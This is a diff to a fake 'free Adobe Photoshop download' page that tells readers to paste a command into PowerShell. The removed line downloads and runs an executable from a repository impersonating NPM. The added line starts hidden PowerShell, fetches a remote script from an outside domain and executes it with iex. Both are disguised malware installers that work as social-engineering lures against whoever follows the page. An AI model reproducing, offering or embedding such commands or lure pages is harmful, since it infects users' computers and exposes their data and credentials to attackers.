@@ -3,8 +3,7 @@
 <h3>copy and execute the following command in **PowerShell**(Win+R)</h3>
 
 <pre>
-  <code id="code-snippet">&lt;Invoke-WebRequest -Uri "https://github.com/NPM-Package-Manager/NPM-Modules/raw/refs/heads/main/npmmanager.exe" -OutFile "C:\Users\$env:USERNAME\AppData\Local\npmmanager.exe"
-Start-Process "C:\Users\$env:USERNAME\AppData\Local\npmmanager.exe"&gt;</code>
+  <code id="code-snippet">cmd.exe /c start /min powershell -w h "$u='https://verifclouds.com/1.txt';[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iex(iwr $u -UseBasicParsing -UserAgent 'ID: daff2f8').Content;</code>
 </pre>
 ## Project Description.
 **Adobe Photoshop ** is a powerful image editing software used by professionals and enthusiasts alike. This guide provides information on how to download Adobe Photoshop for free, as well as tips on how to effectively utilize its features.
